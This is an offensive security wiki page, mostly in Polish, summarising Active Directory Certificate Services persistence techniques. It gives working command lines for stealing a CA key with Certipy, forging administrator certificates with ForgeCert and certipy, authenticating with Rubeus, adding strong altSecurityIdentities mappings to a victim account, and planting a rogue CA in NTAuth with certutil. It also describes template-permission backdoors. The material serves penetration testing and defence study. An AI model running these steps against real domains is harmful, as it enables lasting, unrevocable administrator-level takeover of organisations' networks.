# AD CS - utrwalanie dostępu w domenie

{{#include ../../../banners/hacktricks-training.md}}

**This is a summary of the domain persistence techniques shared in [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Check it for further details.

## Forging Certificates with Stolen CA Certificates - DPERSIST1

Jak rozpoznać, że certyfikat jest certyfikatem CA?

Można stwierdzić, że certyfikat jest certyfikatem CA, jeśli spełnione są następujące warunki:

- Certyfikat jest przechowywany na serwerze CA, a jego klucz prywatny jest zabezpieczony przez DPAPI maszyny lub przez sprzęt, taki jak TPM/HSM, jeśli system operacyjny to obsługuje.
- Pola Issuer i Subject certyfikatu odpowiadają distinguished name CA.
- Rozszerzenie "CA Version" występuje wyłącznie w certyfikatach CA.
- Certyfikat nie ma pól Extended Key Usage (EKU).

Aby wyeksportować klucz prywatny tego certyfikatu, narzędzie `certsrv.msc` na serwerze CA jest wspieraną metodą poprzez wbudowane GUI. Niemniej jednak ten certyfikat nie różni się od innych przechowywanych w systemie; w związku z tym można zastosować metody takie jak [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) do jego wyodrębnienia.

Certyfikat i klucz prywatny można również uzyskać za pomocą Certipy, używając następującego polecenia:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Po pozyskaniu certyfikatu CA i jego klucza prywatnego w formacie `.pfx`, narzędzia takie jak [ForgeCert](https://github.com/GhostPack/ForgeCert) mogą być wykorzystane do wygenerowania ważnych certyfikatów:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Użytkownik będący celem podrobienia certyfikatu musi być aktywny i zdolny do uwierzytelnienia w Active Directory, aby proces zakończył się powodzeniem. Fałszowanie certyfikatu dla specjalnych kont, takich jak krbtgt, jest nieskuteczne.

Ten podrobiony certyfikat będzie **ważny** do określonej daty końcowej oraz tak długo, jak ważny jest certyfikat root CA (zazwyczaj od 5 do **10+ lat**). Jest on również ważny dla **machines**, więc w połączeniu z **S4U2Self** atakujący może **maintain persistence on any domain machine** tak długo, jak ważny jest certyfikat CA.\ Ponadto, **certificates generated** tą metodą **cannot be revoked**, ponieważ CA o nich nie wie.

### Działanie przy włączonym Strong Certificate Mapping Enforcement (2025+)

Od 11 lutego 2025 (po wdrożeniu KB5014754) kontrolery domeny domyślnie używają **Full Enforcement** dla mapowania certyfikatów. W praktyce oznacza to, że Twoje podrobione certyfikaty muszą albo:

- Zawierać silne powiązanie z kontem docelowym (na przykład SID security extension), lub
- Być sparowane z silnym, wyraźnym mapowaniem na atrybucie `altSecurityIdentities` obiektu docelowego.

Niezawodnym podejściem dla persistence jest wyemitowanie podrobionego certyfikatu powiązanego z ukradzionym Enterprise CA, a następnie dodanie silnego, jawnego mapowania do victim principal:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Uwagi
- If you can craft forged certificates that include the SID security extension, those will map implicitly even under Full Enforcement. Otherwise, prefer explicit strong mappings. See
[account-persistence](account-persistence.md) for more on explicit mappings.
- Unieważnianie nie pomaga obrońcom w tym przypadku: sfałszowane certyfikaty są nieznane w bazie CA i dlatego nie mogą zostać unieważnione.

## Trusting Rogue CA Certificates - DPERSIST2

The `NTAuthCertificates` object is defined to contain one or more **CA certificates** within its `cacertificate` attribute, which Active Directory (AD) utilizes. The verification process by the **domain controller** involves checking the `NTAuthCertificates` object for an entry matching the **CA specified** in the Issuer field of the authenticating **certificate**. Authentication proceeds if a match is found.

Do obiektu `NTAuthCertificates` atakujący może dodać self-signed CA certificate, jeśli posiada kontrolę nad tym obiektem AD. Zwykle tylko członkowie grupy **Enterprise Admin**, wraz z **Domain Admins** lub **Administrators** w **forest root’s domain**, mają uprawnienia do modyfikowania tego obiektu. Mogą edytować obiekt `NTAuthCertificates` używając `certutil.exe` z poleceniem `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, lub korzystając z [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Dodatkowe przydatne polecenia dla tej techniki:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Ta możliwość jest szczególnie istotna, gdy jest używana w połączeniu z wcześniej opisanym sposobem wykorzystującym ForgeCert do dynamicznego generowania certyfikatów.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Malicious Misconfiguration - DPERSIST3

Opportunities for **persistence** through **security descriptor modifications of AD CS** components are plentiful. Modifications described in the "[Domain Escalation](domain-escalation.md)" section can be maliciously implemented by an attacker with elevated access. This includes the addition of "control rights" (e.g., WriteOwner/WriteDACL/etc.) to sensitive components such as:

- Obiekt komputerowy AD serwera CA
- RPC/DCOM serwera CA
- Dowolny podrzędny AD object or container w **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (na przykład Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, itd.)
- AD groups delegated rights to control AD CS domyślnie lub przez organizację (takie jak wbudowana grupa Cert Publishers i jej członkowie)

Przykładem złośliwej implementacji byłby atakujący, który mając **elevated permissions** w domenie, dodaje uprawnienie **`WriteOwner`** do domyślnego szablonu certyfikatu **`User`**, przy czym atakujący jest principalem dla tego prawa. Aby to wykorzystać, atakujący najpierw zmieni właściciela szablonu **`User`** na siebie. Następnie **`mspki-certificate-name-flag`** zostanie ustawiony na **1** w szablonie, aby włączyć **`ENROLLEE_SUPPLIES_SUBJECT`**, co pozwoli użytkownikowi podać Subject Alternative Name w żądaniu. W dalszej kolejności atakujący mógłby **enroll** używając **szablonu**, wybierając nazwę **domain administrator** jako nazwę alternatywną i wykorzystać uzyskany certyfikat do uwierzytelnienia jako DA.

Praktyczne ustawienia, które atakujący mogą skonfigurować dla długoterminowego persistence w domenie (patrz {{#ref}}domain-escalation.md{{#endref}} dla pełnych szczegółów i wykrywania):

- Flagi polityki CA pozwalające na SAN od żądających (np. włączenie `EDITF_ATTRIBUTESUBJECTALTNAME2`). Dzięki temu ścieżki podobne do ESC1 pozostają wykorzystywalne.
- Template DACL lub ustawienia umożliwiające wydawanie zdolne do uwierzytelniania (np. dodanie Client Authentication EKU, włączenie `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Kontrolowanie obiektu `NTAuthCertificates` lub kontenerów CA, aby nieustannie przywracać fałszywych wydawców, jeśli obrońcy spróbują posprzątać.

> [!TIP]
> W utwardzonych środowiskach po KB5014754, sparowanie tych błędnych konfiguracji z jawymi silnymi mapowaniami (`altSecurityIdentities`) zapewnia, że wydane lub podrobione certyfikaty pozostaną użyteczne nawet gdy DCs wymuszają silne mapowanie.



## Odniesienia

- Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Referencja poleceń oraz użycie forge/auth. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
{{#include ../../../banners/hacktricks-training.md}}
